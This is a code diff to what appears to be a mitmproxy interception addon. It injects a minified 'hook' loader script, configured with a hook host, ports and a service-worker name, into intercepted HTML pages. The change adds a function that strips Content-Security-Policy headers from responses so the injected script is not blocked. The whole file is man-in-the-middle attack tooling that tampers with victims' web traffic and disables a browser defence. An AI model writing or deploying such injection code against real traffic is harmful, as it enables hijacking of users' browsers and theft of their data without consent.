@@ -27,6 +27,7 @@ with open(path.join(cur_dir, "loader.html")) as f:
     injection = injection_template.render(
         hook_host=hook_host,
         hook_port_http=hook_port_http,
+        hook_port_https=hook_port_https,
         sw_name=sw_name
     )
     injection = jsmin(injection)
@@ -40,18 +41,27 @@ def request(flow):
         )
         
 def response(flow):
-    if flow.response.status_code != 200:
+    response = flow.response
+    disable_csp_headers(response)
+    inject(response)
+
+def disable_csp_headers(response):
+    response.headers.pop("content-security-policy", None)
+    response.headers.pop("content-security-policy-report-only", None)
+
+def inject(response):
+    if response.status_code != 200:
         return
-    content_type = flow.response.headers.get("content-type", None)
+    content_type = response.headers.get("content-type", None)
     if not content_type or 'text/html' not in content_type:
         return
 
-    content = flow.response.get_text()
+    content = response.get_text()
 
     anchor_pos = content.find(injection_anchor)
     if anchor_pos == -1:
         return
     anchor_pos += len(injection_anchor)
     new_content = content[:anchor_pos] + injection + content[anchor_pos:]
-    flow.response.text = new_content
+    response.text = new_content
     
